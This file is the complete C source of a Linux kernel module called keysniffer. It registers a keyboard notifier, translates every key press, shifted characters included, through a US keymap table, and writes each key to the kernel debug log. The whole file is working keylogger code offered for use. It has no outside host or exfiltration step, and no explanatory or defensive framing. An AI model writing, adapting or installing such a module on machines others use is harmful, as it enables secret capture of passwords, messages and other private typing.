/*
 * A Linux kernel module to grab keycodes and show the keys
 *
 * Author: Arun Prakash Jana <engineerarun@gmail.com>
 * Copyright (C) 2015 by Arun Prakash Jana <engineerarun@gmail.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with keysniffer. If not, see <http://www.gnu.org/licenses/>.
 */

#include<linux/init.h>
#include<linux/kernel.h>
#include<linux/module.h>
#include<linux/keyboard.h>

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Arun Prakash Jana <engineerarun@gmail.com>");
MODULE_DESCRIPTION("A kernel module to sniff and log the keys pressed in the system");

/* Declarations */
int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_param);

/* Definitions */

/* Keymap references:
https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
http://www.quadibloc.com/comp/scan.htm */
static const char* us_keymap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},
	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"}, {"_TAB_", "_TAB_"},
	{"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},
	{"_ENTER_", "_ENTER_"}, {"_CTRL_", "_CTRL_"}, {"a", "A"}, {"s", "S"},
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},
	{"'", "\""}, {"`", "~"}, {"_SHIFT_", "_SHIFT_"}, {"\\", "|"},
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},
	{".", ">"}, {"/", "?"}, {"_SHIFT_", "_SHIFT_"}, {"_PRTSCR_", "_KPD*_"},
	{"_ALT_", "_ALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},
	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"}, {"_KPD7_", "_HOME_"},
	{"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, {"-", "-"}, {"_KPD4_", "_LEFT_"},
	{"_KPD5_", "_KPD5_"}, {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},
	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, {"_KPD._", "_DEL_"},
	{"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"}, {"\0", "\0"}, {"F11", "F11"},
	{"F12", "F12"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"_ENTER_", "_ENTER_"}, {"_CTRL_", "_CTRL_"}, {"/", "/"}, {"_PRTSCR_", "_PRTSCR_"},
	{"_ALT_", "_ALT_"}, {"\0", "\0"}, {"_HOME_", "_HOME_"}, {"_UP_", "_UP_"},
	{"_PGUP_", "_PGUP_"}, {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"}, {"_DEL_", "_DEL_"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"_PAUSE_", "_PAUSE_"},
};

static struct notifier_block keysniffer_blk = {
	.notifier_call = keysniffer_cb,
};

int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_param)
{
	struct keyboard_notifier_param *param = _param;
	/* pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%d, value: 0x%x\n",
		code, param->down, param->shift, param->value); */

	if (param->down) {
		if (param->value >= 0x1 && param->value <= 0x77) {
			if (param->shift)
				pr_debug("%s\n", us_keymap[param->value][1]);
			else
				pr_debug("%s\n", us_keymap[param->value][0]);
		}
	}

	return NOTIFY_OK;
}

static int __init keysniffer_init(void)
{
	register_keyboard_notifier(&keysniffer_blk);
	return 0;
}

static void __exit keysniffer_exit(void)
{
	unregister_keyboard_notifier(&keysniffer_blk);
	return;
}

module_init(keysniffer_init);
module_exit(keysniffer_exit);
